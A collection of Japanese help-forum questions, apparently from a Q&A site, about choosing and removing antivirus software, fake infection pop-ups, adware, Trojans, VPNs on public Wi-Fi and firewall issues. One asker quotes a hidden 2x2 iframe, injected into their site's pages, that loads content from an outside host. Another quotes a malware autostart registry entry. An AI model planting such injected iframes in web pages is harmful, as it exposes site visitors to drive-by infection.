某TV番組で「ホワイトハッカー」対「ネットワークセキュリティ会社」の 不正アクセス可不可の対決を観ました。 そこで、疑問に思ったのですが、 ハッキング対象のPCの電源が、完全に切断された状態 (パワーSWが機械式で、電気的に接点が完全に切断されている状態) では、どのようにＰＣ内部のＨＤ等に不正アクセスするのでしょうか？ (某TV番組では、PCの電源はＯＮ状態) 詳しい方、教えて下さい。
ノートンのお試し期間が１０日間を切りました。継続購入を考えていましたが、いろいろ見たところMicrosoft Security Essential　というのがマイクロソフトであるようです。 ただ、私が現在使っているのがＦｉｒｅＦｏｘとＭｏzillaですので有効かどうかわかりません。（家族はＩＥもす） 掲示板にもいろいろ書いてありますが、この点に触れられている回答がないので教えてください。 結局のところ (1)このノートンから乗換えで問題ないか。 (2)乗り換え方法 これを入れてＷＩＮＤＯＷＳ　ファイヤーウォールを有効にすれば問題ないとのことですが・ ノートン継続はは安くしようと思うと中国製のプロダクトキー販売なのでちょっと不安に思っています。 使ってらっしゃる方の感想でも結構です。早急に教えていただけますでしょうか。
ウイルスソフトを入れ替えたいのですが今いれてあるウイルスソフトを完全にアンインストールする方法はありますか？ ウイルスソフトの痕跡を完全に取り払えるのでしょうか？
QNo.8109243「ウイルス対策フリーソフトについて」で質問させていただき、 「Microsoft Security Essentials 」をインストールして様子を見ました。 予想外に、軽く、タスクマネージャのＣＰＵ使用率がほとんど0％に近い状態で安定し、 本当に作動しているのか不安でもあった程です。 ノートンの場合は、バックグラウンドでいつも何か作動している状況が多いようで、タスクマネージャで確認しますと、ＣＰＵはよく増減し、落ち着かない状態でした。 メール（アウトルックエクスプレス）の受信時でも、一瞬で受信してしまい本当にチェックしているのか、ちょっと不安でした。 ちなみにノートンの場合は、受信に多少時間がかかります。 現在は削除して、ノートンを再インストールして使っている状況ですが、またフリーズやブルースクリーンが多発するようになり、ブルースクリーンには無関係でしょうが、フリーズには関係あるようですので、「Microsoft Security Essentials 」に戻したいと考えています。 フリーズに関係あると考えるのは、ＣＰＵ使用率100％の状態が継続（ＣＰＵ負荷が高い状態） すると、間もなくフリーズに至り、その原因が、ノートンのプロセスであるためです。 ノートンに問題があるわけではなく、ライブアップデート時に負荷が書かある場合があり、結果的にＣＰＵが100％になるとの認識です。（ＰＣの問題（不具合）かと思います） 手動でアップデートをしても、完了前にフリーズ（ＣＰＵ100％状態）することもありますので、アップデートの中身が重たいものである時に、フリーズするのでは？と思うわけです。（素人の想像に過ぎませんが・・・） ※　フリーズの原因自体は特定できていませんが、いろいろ質問させていただいた結果から、 　　マザーボードの不具合の可能性を疑っています。 ■「Microsoft Security Essentials 」でも基本的に問題ないと考えて良いのでしょうか？ とはいえ、フリーで良ければみなそうするわけでしょうから、それなりの欠点があるのでは？ たとえば、検出率が低い可能性がありますが、現実的に、感染する可能性が格段にＵＰする事になるのでしょうか？ あるいは、それほど気にするレベルではないと考えて差し支えないでしょうか？ また、ファイアーウオール機能はないようですが、ウインドウズ本体のファイアーウオール機能をＯＮにすれば問題ないのでしょうか？ その他、何か助言がありましたら、よろしくお願いします。
Win32.Troj.Generic.a.(kcloud) これはどんなウィルスですか？ 危険度等教えてください。 また、もし悪さをした痕跡を確認できたら確認したいのですが、方法はありますか？
まえ、海外のサイトからダウンロードしたものがあるんですが、それにウイルスが入っているかどうか調べたいです。パソコンにMcAfeeは入ってるんですが、あれってアドレスとかからウイルスが入ってるかどうか調べるんですよね（多分）？なので、ファイルをブラウズしてその中を調べてくれるようなソフト、またはサイトなどあれば教えてください。お願いします
　【使用セキュリティソフト　Avira Free Antivirus】 - アビラ 　　最後に問題が見つかったファイル： C:\Program Files (x86)\Adobe\Adobe Help\Adobe Help.exe 　　最後に見つかったウイルスまたは不要なプログラム： TR/Dropper.Gen 　　ウイルス情報（Aviraウイルスラボ） 危険度は、、５段階中１　でした。　 これはどんな悪さをするのですか？ もしかして、トロイの木馬ですか？ 些細なことでも構わないので情報ください。
質問させて頂きます。 趣味で似顔絵を描くサイトをつくろうと考えています。 描いてほしい人がサイト宛(私宛)に写真をおくり、それを見ながら描こうと思うのですが、ウィルスが心配です。 よくウィルスは添付ファイルから感染すると聞きますが、不特定多数の人から画像を送ってもらうのは危険でしょうか？ Avila　free　antivirusというソフトをパソコンに入れているのですが、フリーソフトなのでちょっと不安です。 写真、画像を安全に受け取る良い方法を教えてください。
先週、書店で有名パソコン紙（２０１３年７月号）を購入し、「遅い！重い！７＆ビスタ不満解消」特集に従がい、ドライブの空きを増やすため、操作手順にあるとおり、「アイオービット・アンインストーラー」なるソフトをインストールし、操作しましたが、その通り進まず、あきらめました。しかし、その後下記のようなポップアップウィンドウがいくつも出てくるようになり困っています。 コントロールパネルで不要と思われるソフトをアンインストールしましたが、まだ出てきます。これらを削除する方法を教えてください。 「警告！　お使いのＰＣがクラッシュ寸前です。ＯＫをクリックして無料修理－ＯＫ－」 「Microsoft CERTIFIED Partner Windows のエラーを直ちに修正して下さい。－リペアツールをダウンロードする－」 「ＰＣシステムクリーナ　　ダウンロード　－今すぐ開始－」 ・・・・等々 ＰＣはVISTA です。
インターネットエクスプローラーを使っているとき添付のような表示が出るようになってしまいました。 ウィルス対策ソフトでスキャンしますが、ウィルスの検出はしません。 インターネットエクスプローラに"棲み付いた"なにかなんでしょうか？ 対応策を教えて下さい。
インターネット上のドキュメントや、セキュリティーソフトのサポートに問い合わせてみると、ウィルス感染等により個人のパソコンから個人情報や、ファイル自体の流出、または盗まれる場合があることを知り、心配しています。(セキュリティソフトをインストールしていても完全には防げないそうです。) パソコンで重要なファイルを開く場合はインターネットの線を抜くことは効果的でしょうか？また、どのようにして個人情報の流出を防げるかを教えていただければありがたいです。よろしくお願いいたします。
スマホで無料Wi-fiを利用する際のセキュリティについて質問です。 現在、Androidのスマホで「avast! Mobile Security」を使用しています（rootを取っていないので ファイアウォール機能は使用していません） 例えば、スタバなどの無料のWi-fiを使用する際のセキュリティ対策として、このAvastだけでは不十分でしょうか？ VPN接続をすれば安全だという内容の記事を読んだので とりあえず、↓の「TunnelBear VPN」というアプリを入れてみました https://play.google.com/store/apps/details?id=co … このソフトだと簡単にVPN接続ができてるっぽいので、このままAvast+TunnelBearの組み合わせで いこうと思うのですが、このTunnnelBearでよく言われてるような安全なVPN接続ができているのか不安です。 ↓の「Hotspot Shield VPN」というアプリも入れてみようと考えたのですが、セキュリティソフトのような機能もあるっぽいので Avastと競合するかどうか分からないので手が出せません。 http://hotspotshield.biz/ https://play.google.com/store/apps/details?id=ho … 簡単に設定できるような、公衆無線環境でのセキュリティ対策があれば教えて頂けないでしょうか。 よろしくお願いします。
最近外国の無料のソフトをダウンロードしたら、普通にネットをみていて、画面をクリックすると別タブで変なゲームが立ち上がっちゃうようになりました。 https://ad.yieldmanager.com/rw?title=&qs=iframe3 … そのＵＲＬをコピーしたのが↑です・・・ 問題のソフトはアンインストールしたのですが、どうにもなおりません。 やっぱりウィルスなのでしょうか？ そして、ウィルスを駆除するフリーソフトはあるんでしょうか？ ウィルスバスター等で保護していないのが悪いんですよね。
こんにちは。 リースしたばかりのPCでAdvanced System Protector というのでウィルスが検出されました。 rcs.planetremote　Remote Control Tool　というもののようです。 インストールしているウィルスソフトのシマンテックで完全スキャンをしている最中なのですが このウィルスは悪いものなのでしょうか。 （シマンテックの高速スキャンでは問題なし） Advanced System Protector がどうも評判の悪いソフトのようで rcs.planetremote　Remote Control Toolで検索してもあまり出てこず困っています。 アドバイスよろしくお願いたします。
カラリオ EP-905Aを無線で印刷できなくなりまいた。（それまでできていたのですが） 「スーパーセキュリティZERO」を使用していますが、ファイアウォールをOFFにすると印刷できました。 ファイアウォールをONにしたままで印刷できるようにしたいのですが、どなたか教えてください。
カスペルスキー・インターネットセキュリティー２０１２についてお尋ねします。 ２０１２を２０１３へ無償アップデートする場合、２０１２を完全アンインストールしてから、２０１３をインストールするのでしょうか。 別に２０１２を入れたままで、２０１３をインストールしても構わないのでしょうか。 ご存じでしたら、教えてください。
最近、『直アド交換掲示板』というメールが届くようになりました。 （この種類のものは初めて受信しました） 内容が意味不明なので開かないようにしています。 送信元はアルファベットの並んだ今まで見たことの無いものです。 表題の所に　『Re：』が有り、次の行には、『ｉｎｆｏ　”10～12桁のアルファベット＠”111桁のアルファベットと数字”．ＵＳ”』 そして本文には 『直アド交換掲示板』 　　↓↓↓　　　・・・・・・三本の下向き矢印が有ります。 『ｈｔｔｐ//”13ケタのアルファベットと数字”.us/od/』 と表示されています。 そして、その下に 『メルマガ停止』 『stop_mailcenter@yahoo.co.jp』 と表記されていて、これをクリックするとメールの返信ページになります。 意味不明なので、 『ｈｔｔｐ//”13ケタのアルファベットと数字”.us/od/』 は開いていませんが、このメールは、一体何なのでしょうか？ ご存知の方はよろしくお願いします。
先日、FTPのパスワードが漏えいしHPの内容が改ざんされるということが起こりました。 当方のPCはウイルスバスターでOSも含めすべて最新の状態になっています。 この状態でFTPパスワードが漏えいするということはあるのでしょうか？ ※パスワードはPCにはドキュメントとして置いてありますが、WEBのどこかで入力したことはありません。 ※サーバ側では漏えいは絶対にないと言われました。（大手プロバイダです） ※トレンドマイクロでは、ウイルスバスターおよびＯＳが最新の状態でウイルス感染する可能はないと言われました。 ※ＰＣのウイルススキャン結果は感染なしです。 FTPソフト：FFFTP OS:WindowsXP pro ウイルスバスタークラウド2011
コンピューターに感染 ファイルが見つかりました 今スグ無料で修正と画面に出ます。 これを削除する方法を教えてください お願いします
一応サポートに連絡して返事待ちですが、インストールしたらネットが無効になり繋がりません。 比較的新しいソフトなので情報もないようですが、何かヒントはないですか。 Windows8 64bit、有線接続です。 LAN自体が無効になり、接続されていないと出るため、エントリーも出来ないのでアップデートも不可です。
ノートパソコンでWIN7　６４ビット　サービスパック１を使用中です。 デスクトップ上に定期的にアップデートの案内がでます。 アップデートをしても良いのですが、何のアップデートか不明です。 画像を添付しましたが、教えていただけないでしょうか。 よろしくお願いします。
ウイルス手動駆除のやり方教えて下さい。 パソコン全くの素人です。 ウイルス　JS_BLACOLE.SMTT　に感染したみたいです。 古いパソコンでウインドウズNTです。 ウイルス手動駆除のやり方教えて下さい。 宜しくお願いします。
現在Kaspersky2013を使用しています。 iphone4Sでwifi接続をするとPC上に 「ネットワーク攻撃DoS.Generic.SYNFlood：　192.168.*.*からローカルポート： 80へのTCP。 ブロックしました。ネットワーク攻撃による接続をブロックしています。」 と表示されiphoneのwifiが切断されます。 192.168.*.*というIPアドレスはどこから来ているんだろう？と思い調べみたら iphoneのwifi設定で使用しているIPアドレスでした。 PCを起動していると上記のエラーが出て１～２時間間隔で接続が切れます（ブロックされます） PCを起動しなければ接続が切れません。 我が家のネット環境はJ-COMで、支給されたルーター（NETGEAR　CG3000D）を使用しています。 いろいろ調べたところ「バッファローのルーターをKasperskyがブロックする」という似たような症状が あるようで、その時の解決法は「ネットワークサービス解析のチェックを外す」というやり方で 解決するようですが、NETGEARで同じような解決方法があるのでしょうか？ でも今回はルーターではなく、wifi接続しているiphoneがPCを攻撃しているとみなされ ブロックされているようなので、どうしてこうなるのかさっぱり見当が付きません。 何か解決方法はありますでしょうか？
お世話になりますが ここ10年間、セキュリティソフトはノートンでしたがあと1か月で切れてしまいます。 ネットで調べるとノートン以外にESETなるソフトがありましたが？ ノートンと比べてどうですか？ 動作が軽いなど記載がありましたが？？？ 軽さもありがたいのですがセキュリティ面ではいかがでしょうか？？？ お使いの方、アドバイスお願いします。
上記につき、質問します。 ＷＩＮ　ＸＰのサポートをマイクロソフトが締め切り、ＷＩＮ７や８への移行を推奨しています。 ＷＩＮ　ＸＰを使い続けたデメリットとして、セキュリティ面の不安があるとのことです。 http://blogs.technet.com/b/jpsecurity/archive/20 … しかし、他方でハッカーによる情報の流出なども報道されています。 http://www.nikkei.com/article/DGXNASGM28048_Y3A5 … アメリカの軍事産業は当然、相当なセキュリティ対策をしていると思うのですが、それでもこのような流出事件がおき、クレジットカード情報の流出なども報道されている以上、ＯＳのアップデートくらいではマルウェアやハッカーの攻撃は防げず、ＷＩＮ　ＸＰからＷＩＮ７や８の移行は、セキュリティ面からはあまり意味のない行為なのでは？と思えるのですが、皆さんどう思われますか。 （洪水の時にベニヤ板一枚で防ごうとするものかと・・・） 個人のＰＣが、軍事最先端機密の詰まったコンピュータレベルの防護に及ぶとは思えません。 セキュリティソフトはノートンとカスペルスキーを入れていますが、ＯＳにおけるセキュリティ面でのＷＩＮ　ＸＰからＷＩＮ７や８の移行推奨は、ＭＳやコンピュータ業界の販売促進活動の一貫と見るのは、うがちすぎなのでしょうか。 特に詳しい方の回答がいただければ嬉しいです。
数年前に疎遠になった知り合いのフリーのアドレスからスパムメールが送られてきました。 誤って開いてしまい、海外のダイエットサイト？のようなところに繋がりました。 意味がよくわからなかったのですぐに消しましたが、これはどのような被害を受ける可能性がありますか？ ウイルス対策としてはNorton360を入れています。 現在ウィルスチェックはNortonでかけていますが、他には何をしたらよいですか？ すみませんが助けてください。お願いします。
個人でHPページを開設しているますが、ある時間になるとHTMLの内容が勝手に書き換わってしまいます。 何かわかる方教えてください。 ※ある時間になるとHPのサーバエリアのHTML全てに以下の文が勝手に挿入されてしまう。 <iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://wypromuj.nazwa.pl/cmof.html?i=3353573></i …
今朝、パソコンを起動すると画像のファイルが、 ウイルスセキュリティより検出されたので、 「ブロック」を選択したのですが、その後から、 インターネットが繋がりません。 何か解決方法や原因を教えて頂けますでしょうか？
Excel2007を操作中標記警告が出ます。 式とリンクを多用した自分自身で作成したファイルです。 警告文を、ウイルスとリンクしている可能性ありと、読みました。 そこで、オプションを選ぶと、下段の画面になりました。 発行元が自分なのに、信頼できないと判断されているのでしょうか？ 安全のためにはありがたい警告と思う反面、しばしば現れるので、鬱陶しさも感じています。 警告の意味とどうすればよいかを教えて下さい。
windows7にavastを入れています。 avastは１日に２回、ウィルスの定義の更新をするようですが、 その際、インターネットの接続が止まります。 再立ち上げをすると治るのですが これを解消する方法はないでしょうか。
ファイアウォールを無効化したいんですがファイアウォールの無効化または有効化というのが選択できません。そこでhttp://lohas-pc.com/modules/pico/index.php?conte …こちらの通りやってみたのですが、サービス停止しようとすると『ローカルコンピューターのwindows ファイアウォールサービスを停止できません　エラー:5 拒否されました』と表示されできませんでした。何か解決策はないでしょうか。よろしくお願いします。
windowsXP（ＳＰ3）でノートンインターネットセキュリティー（2013年版）を入れています。 （メモリ1ＧＢ） 最近ＰＣの調子が悪いため、いろいろと試しています。 11年も使っていますのでさすがにＰＣの寿命が近いようで、フリーズやブルー画面が時々起こるようになりました。 マザーボードやメモリの不良の可能性が高いようです・・・。 ＰＣは使えるのですが、時々ノートンがバックグラウンドで作動した時に、ノートンのプロセス（ccsvchst.exe）が100％状態でフリーズに至ります。 アイドルタイムでのフリーズが多いのも、そのためかと思われます。 ＰＣ使用中にフリーズに至る事はめったにありません。 ＰＣ使用中でも、アップデートなどによりノートンのプロセスの変動が激しくなり、ＣＰＵ100％に至り、フリーズする事もありますが、大抵はフリーズしないで落ち着きます。 大半がＰＣから離れたアイドルタイムにフリーズします。 マザーボードやメモリの不良の可能性を明確にする意味においても、 念のためノートンをアンインストールして、丸一日程度様子見したいと思っていますが、その間ノーガードではまずいため、フリーソフトを入れたいと思っています。 初心者レベルでも簡単にインストール、削除ができるソフトを探していますが、 フリーソフトの場合ファイアウオール機能が付いていないようですし、一日でもファイアーウオール機能がない事に不安、があります。 問題ないとは言えないでしょうが、一日程度なら・・・・思い切って・・・という考えもチラッとあります。 フリーのファイアウオールソフトもあるようですが、セキュリティソフトとメーカーが違うとか、相性など、どうなのでしょうか？ どれを選んでも問題ないでしょうか？ 翌日にはすべて削除して、ノートンを再インストール予定ですが、なんら問題ないでしょうか？ 「一日限定の仮セキュリティソフト」として、お勧めなソフトがありましたら、お願いします。
古いXPで、Ｍｉｃｒｏｓｏｆｔ Security Essentialを使っています。 「プログラムの追加と削除」を開こうとした時など、プログラムの一覧を表示する際に、 インストールされている全てのプログラムを検査をしているようで、 開くまでかなり時間が掛かります。（MsMpEng.exeがCPU100%になっている） 二回目以降は早くなりますが、再起動するとまた一回目は読み込みが遅くなります。 Avast!を使っていた時はこのような症状はありませんでしたが、 このままMSEを使っていきたいと思っています。 何か良い対応策はないでしょうか？
ｗｏｏｐｉｅ　がしっかり起動しないため、アンインストールして、再びインストールしたらおかしくなりました。 ＥＳＥＴ　Ｓｍａｒｔ　Ｓｅｃｕｒｉｔｙのセキュリティーを使っています。 ＥＳＥＴ　Ｓｍａｒｔ　Ｓｅｃｕｒｉｔｙ（通知～件） アドレスはブロックされています。 ＵＲＬアドレス：ｈｔｔｐ；//ｐｒｏｆ.ｅｏｒｅｚｏ.ｃｏｍ/ｃｇｉ-ｂｉｎ/ｃｒｅａｔｅ＿ｐｒｏｆｉｌｅ.ｃｇｉ ＩＰアドレス：・・・・・ のようなものがいっぱい出るようになりました。通知が100件を超えて 消えずに困っています。 また、パソコンが思いからクリックしろといういかにもフィッシング詐欺的なインターネットの画面が出るようになりました。 ＥＳＥＴ自体は異常なしということなのでどうしたらいいでしょうか？
トロイの木馬に感染しました。駆除方法を教えてください。パソコン初心者なので簡単に無料で駆除する方法を教えてください。
パソコン内にインストールされているブラウザではないアプリを起動させると、そのアプリ名で勝手にネットに接続しているものが数個あります。(firewallのログを見て分かりました) それらアプリ自体は多くの人に利用されているもので、特に危険というわけではありません。 ただ最新バージョンかどうかをチェックする以外では、ネットに接続する必然性はないアプリです。 1 ブラウザ以外のアプリでインターネットに接続するすことが出来るのは、そのアプリにインターネット接続用のコンポーネントが搭載されているためでしょうか。 それともインターネット接続用のコンポーネントは備わっていなくて、パソコンにインストールされているIEなどのブラウザのコンポーネントを勝手に拝借してインターネットに接続しているのでしょうか。 2 パソコンにインストールされている、あるアプリを起動すると勝手にポート80の外部IPアドレスに接続しています。 process explorerで、そのアプリのlower pane を見るとType(Key)のところに HKCU\Software\Policies\Microsoft\Windows\CurrentVersion\Internet Settings HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings HKCU\Software\Microsoft\Internet Explorer\Main などとあります。 この事は、このアプリにネット接続機能はなくパソコンにインストールされたInternet Explorer を拝借してネットに接続している証となりますでしょうか。 3 アプリ自体にネット接続機能はなく、パソコンにインストールされているブラウザ(Internet Explorer)の機能を拝借してネットに接続しているときには、その接続はInternet Explorerのセキュリティレベルが適用されるのでしょうか。適用されるとなるとIEのセキュリティレベルが低いまま(ActiveXなどが実行されるレベル)で外部に勝手に接続するアプリを起動させてきた事は危険ということになります。
初心者です。 よろしくお願いします。 先日、みかけないEXEファイルがあり、完全スキャンしたところ・・・ 「７８」もウイルスが見つかりました・・・。 初めてです。 思い当たることがなく、なぜ感染かは不明ですが・・・ ドライブは、CとDをパーティションでわけて、あとは外付けHddが１台。 「Autorun.inf」が、Dと、外付けにできており、削除しても復活する。 その都度、不明EXEファイルも、２～３個できるの繰り返し・・・。 セキュリティソフトで、削除→再起動でも復活。 腹をくくり・・・クリーンインストするしかなさそうですが・・・ ●そこで、必要ファイルをバックアップしようと思いましたが、 ●感染してなくても、感染してたドライブからコピー→バックアップしない方がいいでしょうか？ ●もちろん、感染したファイルは、もう見切るしかないですよね？ ちなみに、感染したものは、写真１枚も含み、関係のないアプリが多く、 shurikenや、家計簿、動画編集ソフトなど・・・ ウイルスって、ファイル作成だけでなく、関係のないソフトまで、食い散らすんですね・・・ 初めてで、もうパニックですが、クリーンしかないと思えば・・・です。 あとは、大切なファイルがあるので、バックアップするか迷ってます。 ●また、クリーンの際、現状のCと、Dのパーティションも削除し、新たに作成した方がいいでしょうか？パーティションおいたまま、CとDのそれぞれフォーマットでいいでしょうか？ ●その際、単なるフォーマットではなく、専用ソフト（完全抹消）を使用した方がいいでしょうか？ 無知で、初心者ですが、アドバイスあればお願いします。 ●Windows　7　64Bit ●１日中、電源入れたまま（iTunsをかけたまま） ●上記の感染した外付けも、あと２台、新品があります。 ●ルーター入れてます。 ●カスペルスキー　2013です。
社内で無線ランを検討していますが、PCの環境など問題ありませんが 銀行決済などを電子証明付きのPCで行っているため、無線ランを活用したいのですが セキュリティ面で心配なのですが、詳しい方、同じ環境の方がいましたらアドバイス下さい。 一番心配なのは遠隔操作されたらとか、無線のセキュリティを破ってPCに進入とか・・・
Secunia PSIを使ってインストールされているいくつかのアプリケーションを最新バージョンにアップデートしました。 Secunia PSIを初めて起動させたときに[LOADING...]とずっと表示されたままで、その先に進みませんでした。 そこで、Internet Explorer のセキュリティレベルを[高]から[中]に下げました。 その状態でSecunia PSIを起動させると、最新バージョンのダウンロードとインストールを自動的にするように設定していたお陰か、意識することもないまま無事アプリーケションのアップデートを終えました。 Secunia PSIは起動すると、パソコンの中のアプリケーションのバージョンとSecuniaのデータベース情報のそれらのアプリケーションのバージョンを比較して、最新バージョンでなければSecunia PSIは各アプリケーションのページに行って最新版のアプリケーションをダウンロードしてくると思います。 セキュリティを考える上で心配なのは、Secunia PSIがダウンロードの為、アプリケーションのページにアクセスした時に、Internet Explorerのセキュリティレベルが適用されるのではないか、ということです。 Internet Explorer のセキュリティレベルを[中]にしたので、これだとActiveXやJavaアプレットなどセキュリティ上危険なものを実行できてしまいます。 最新版のアプリケーション配布ページに色々仕組まれていると、そのアプリケーション以外に危険なものまでパソコン内にインストールされる、なんてことも起こっているのではないかと心配です。 Internet Explorerのセキュリティレベルを下げてSecunia PSI を起動させると、上で書いたようなことが本当に起こってしまうのか、教えてください。
今度ウイルス対策ソフトの期限が切れそうなので買うことを考えています。 考えているのはカスペルスキー、ウイルスバスター、ESET Smart Security、ノートンのどれかを考えています。 どれがお勧めでしょうか。 ウイルスなどの検出率が高く、怪しいサイトをガードできればコストは多少かかってもいいと考えています。 評価サイトを調べてみてもよくわからなくて困っています。 その年によって製品の評価は変わると思うので3年ごとではなく更新は1年ごとにするほうが良いでしょうか。 OSはwindows7です。 回答よろしくお願いします。
スマホ初心者です。 アマゾンでドコモのスマホ（xperia GX so-o4D)を買って、OCNのモバイルエントリーLTE９８０で データ通信をしようと思います。ドコモとはいっさい契約はしていません。 １、その場合、ウィルス対策はどうしたらいいでしょう。 　　一般的には皆さんどうしてるんでしょうか？無料のウィルス対策ソフトをダウンロードできたら一　　　番いいのですが。 ２、hotmailはポップ受信できますか 宜しくお願いします。
vista を使用中です。 意識して使っているAppleのソフトは無いはずです。 それなのにこの画面が急に現れました。 とりあえずは終了ボタンを押しました。 初めてのことで、Appleからか、なり済ましか判断できません。 教えて下さい。
セキュリティ対策ソフトについてです。 パソコンを買った当初は無料で一定期間、セキュリティ対策ソフトを使用できましたが、その期間が終了したので何かソフトを購入しようと思います。 ノートンが一般的だと聞いたのですが、これである程度のウイルスは防ぐことはできるのでしょうか？ また、このソフトをインストールしたからといって何かネット接続等で問題が発生したり、その他の問題が生じることはないでしょうか？ あまり詳しくないので、どなたか、教えて下さい！！ 他にも、ウイルス対策のためにしておいた方がいいことはありますか？
http://www.itmedia.co.jp/news/articles/1305/23/n … バスターのサポートはXP公式サポート終了後も続くようです。これで、安全は維持されてると思うのですが何か問題はありますか？7や8とリスクはどの程度違うのでしょうか。具体的にどういうリスクがあるのか教えてください。思い入れのあるPCなのでなるべく長く大切に使いたいです。
XPを最近リカバリーしました。メールが使えるように復元しました。そのあとノートンアンチウイルス2006をインストールしました。そうするとメールが使えなくなりました。受信時にエラー番号０ｘ８００ｃｃｃ１５が出ます。アンチウイルスの更新ができないので困っています。2006を停止させてもエラーは解消しません。どうすればメールできるでしょうか。よろしくお願いします。
この度富士通のノートPC（2013年春モデル）を購入しました。 コジマで購入した際、ポイントで買えるしお勧めですとノートンインターネットセキュリティ同時購入1年版を3,980円で同時に購入しました。 前のPCではキングソフトを使ってましたが、この機会にノートンにしてもいいなと思って購入したのですが、家に帰ってノートPCをセットアップしたらノートン90日間お試しパックがすでにPCに入っており、購入したノートンをインストールするまでもなくノートンユーザになれました。 そのうえ、90日間お試し後1年購入は1000円ちょっとというキャンペーン中で、買ったノートンがあまりに意味がなかったと後悔しております。 そこで質問なのですが、この買ったノートンですが、1年後に使用することは可能なのでしょうか？ 可能であるならば、90日後に1年延長購入（1000円強）をし、1年後に期間が切れたら今回買ったノートンを改めて使用というのが理想的かなと思ってます。 今まで、キングソフトは永久無料だった為、期限付きのウィルスソフトの仕様がよくわかりません。 1年後に使えないようなら、お店に返品できないか相談しようと思ってます。（ちなみに購入は水曜日でした） そもそも富士通の春モデルからノートンのお試し版がつくことはHPを見ても記載されていたので、 店員のお兄さんがなぜ勧めてきたのかが謎です。（そこまで考えてなかったのだと思うのですが） ただポイントで購入してしまったので、返品できるかが心配。 ご回答のほど、よろしくお願いいたします。
AVG Internet Security 2012を使っています。 最近になって、「脅威はブロックされました。」というアラートが何回も出たので、 念のため、ウィルスチェックをしたのですが、何も感染していませんでした。 これは新種のウィルスか何かなのでしょうか？
　初心者です。ウイルスセキュリティの「システム防御の履歴」に下記のようなレジトリの表示でレジトリ項目をブロックしましたと表示されています。また、「値」の項　としても残って表示されいます。「値」については、探し出して削除しましたが、レジトリはどのように探してよいのか分かりませんし、削除すべきかも分かりません、お教え下さいませんか。OS windows7 Home premium 　Ｗｅｂサイトなどには、レジトリまで削除などするべきというのを見てお聞きします。 ouＸＸＸＸw.lnkをWindows起動時に自動でロードするためのレジストリ項目をブロックしました。 レジストリ詳細： メインキー :HKCU\Software\Microsoft\Windows\CurrentVersion サブキー :Run 値 :impiession outlhw="C:\Users\XXXXXXX\AppData\ＸＸＸＸＸ\Google\ouＸＸＸＸ.lnk"
インターネットに繋いでいないパソコンにウイルス対策ソフトは必要ですか？ ・インターネットに繋いでいるパソコンとのUSBでのやり取りのみ ・他のUSB（他者から借りた・貰った・よそで使った）は使わない ・インターネットに繋いでいるパソコンにはウイルス対策ソフト導入済み ・どちらのパソコンも自宅での使用のみ、持ち出しはない この条件で使用する場合でもウイルス対策ソフトを入れるべきでしょうか？ ちなみにインターネットに繋いでいないパソコンでの作業は文書作成が主になります。
カスペルスキーを買いました。 アクティベーションコードを入れて緑の「安全に保護されています」みたいなのが出たら、やる事は終わりですか？ カード情報とかウイルスからパソコンは守られている状態になってますか？ ウイルスが見つかったりしたらどういう操作をして駆除すればいいですか？ それと、レポートを作成しました。という文章も出てくるのですが、これはどうしたらいいのでしょうか？ たくさん質問してしまってすみません。
ウイルスバスタ 　何処に頼むのですか？ 年間５千円～　３千円　？ 　皆さんやっていますのかしら？ これって変です。 　いたちごっこ見たい。 識者様教えて頂けませんでしょうか？
他人からデータを受け取る際にお借りしたＵＳＢを自分のパソコンに挿したら カスペルスキーでウイルスが検出されました。 カスペルスキーで駆除も同時にできたので感染は免れたと思いますが， この事実をそのUSBの持ち主に伝えたほうがいいのでしょうか。 ウイルス付きメールは必ずしも送信者が感染していたわけではないので 送信者に知らせても意味がないという話を聞いたことがありますが， USBの場合はどうなんでしょうか。 感染を広げないためにも報告だけはしたほうがいいのかなと思いますが USBの持ち主ご本人のパソコンは感染していないということがあり得るのでしょうか。 相手は親しい友人ではなく仕事関係ですので 失礼に当たるといけないと思い質問させていただいた次第です。 常識としてはどう対処するべきなのでしょうか。 よろしくお願いいたします。
Windows8にウイルスバスターなどを入れる必要はありますか？
Windows7でウィルスバスタークラウドを使ってました。 近々期限が切れるので調べたんですが、市場ではウイルスバスターは性能の評価が今一つのようです。 そこで、次は　「ESET Smart Security」　「ESET パーソナル セキュリティ」　「Norton Internet Security」　のどれかにしたいと思ってます。 ふつうなら体験版を入れてみるところですが、ESET Smart Securityはアンインストール時にトラブルを起こすことがあり、リカバリーする羽目になったという話も聞きます。 どんなトラブルかわかる方がおられましたら教えてください。 パーソナルセキュリティのほうも同じでしょうか？　(こちらは評判がいいものの、レビューが少なくて本音の情報がなく不安です) また、みなさんのおすすめソフトもお願いします。
現在インターネットのセキュリティはマカフィーを活用しています。 ふと思ったのですが、一か月に６９８０円かかっています。 これは高いような気がしてきました。 貯金もしたいので今からでもなるべく安い会社のセキュリティソフト？ にしたいと考えています。 そこでみなさんが使っているセキュリティの会社やソフトを教えてください。 それがどこまで対応していて、月々いくらくらいなのか、 また、これは安くてオススメだというものも教えていただけると嬉しいです。 よろしくお願いします。
自宅でノートパソコンを使うのに、セキュリティーソフトを探しています。 みなさんはどんなソフトを使っていますか？
一長一短がおれぞれのウイルス対策ソフトにあるようで、どれが一番いいか、おすすめなのかがいまいち分からなくて質問しました。 アドバイスよろしくお願いします。
最近何故かパソコンを起動するとトロイの木馬generic32.cbwsというのが感知されるようになりました。 駆除すると駆除完了となるのですがそのあとも２０分おきに感知してしまいます。 今日で三日くらい連続でなっています。 使っているセキュリティーソフトがAVGの無料版です。 どうしたらいいでしょうか。 回答宜しくお願いします。
ＰＣ初心者向けのウィルスセキュリティソフトを教えてください
とあるりゆうで、Hotspot Sheieldをインストールしたのですが。もう必要ないので、アンインストールしました。このソフトをインストールしたら広告が入るみたいなのですが、アンインストールしても広告がきえません。いろいろ調べてみたんですが、解決策がみつからず困っています。アンインストールはこれをインストールしているフォルダにあるアンインストールツールをつかって削除しました。一応消えてはいます。しかし広告だけ普通にでてきます。ブラウザでgoogleをひらけば真ん中に横長の広告がでてくるし、ページが変わるごとに、広告が出てきます。msconfigでhotspot shieldの項目のチェックを外すなどの回答がありましたが、アンインストールされてるし、それらの項目はありません。非常にこまっています。 解決策おしえてください。 yahooやmsn。などで検索すると広告はでないかんじです。googleで検索すると確実にでます。 自分はgoogleをよくつかうし、広告を表示させるプログラムが入ってしまっているとおもうので、何とかして消したいです。お願いします。
